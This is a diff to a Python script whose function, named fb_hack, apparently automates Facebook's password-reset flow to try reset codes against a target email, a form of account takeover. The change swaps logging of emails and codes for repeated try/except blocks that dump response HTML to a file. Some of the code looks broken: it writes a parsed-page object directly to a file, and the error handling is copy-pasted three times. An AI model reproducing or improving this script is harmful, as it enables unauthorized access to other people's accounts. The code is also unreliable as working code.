@@ -81,23 +81,40 @@ def fb_hack(email, codex):
   """selection confirmation"""
   try:
     browser.select_form(nr=0)
+    browser.submit()
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a") as z:
-        z.write(str(codex))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
-    raise
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("soupa.txt", "a+") as f:
+      f.write(soup)
+      f.close()
+    print(soup)
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("soupa.txt", "a+") as f:
+      f.write(soup)
+      f.close()
+    print(soup)
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("soupa.txt", "a+") as f:
+      f.write(soup)
+      f.close()
+    print(soup)
+    sys.exit()
   """reset code input"""
   y = int(codex)
   response1 = browser.response()
